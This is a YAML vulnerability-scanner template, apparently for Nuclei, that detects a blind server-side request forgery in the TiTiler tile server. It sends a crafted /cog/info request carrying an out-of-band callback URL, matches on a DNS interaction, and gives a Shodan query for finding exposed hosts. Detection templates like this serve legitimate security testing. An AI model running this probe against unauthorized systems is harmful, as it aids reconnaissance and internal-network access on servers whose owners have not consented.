http:
- matchers:
  - condition: and
    dsl:
    - status_code == 500
    - contains(interactsh_protocol, "dns")
    - contains(body, "<imageAttributes> in document")
    type: dsl
  raw:
  - 'GET /cog/info?url=http://{{interactsh-url}} HTTP/1.1

    Host: {{Hostname}}

    '
id: titiler-ssrf
info:
  author: xbow,DhiyaneshDK
  description: 'Blind SSRF vulnerability in TiTiler, a dynamic tile server for Cloud
    Optimized GeoTIFFs (COGs). The flaw lies in how the application handles the url
    parameter in the /cog/info endpoint, allowing attackers to make arbitrary internal
    or external HTTP requests.

    '
  metadata:
    max-request: 1
    shodan-query: html:"TiTiler"
    verified: true
  name: TiTiler - Blind Server Side Request Forgery
  reference:
  - https://xbow.com/blog/xbow-titiler-lfi/
  severity: high
  tags: titiler,oast,obb,ssrf,vuln
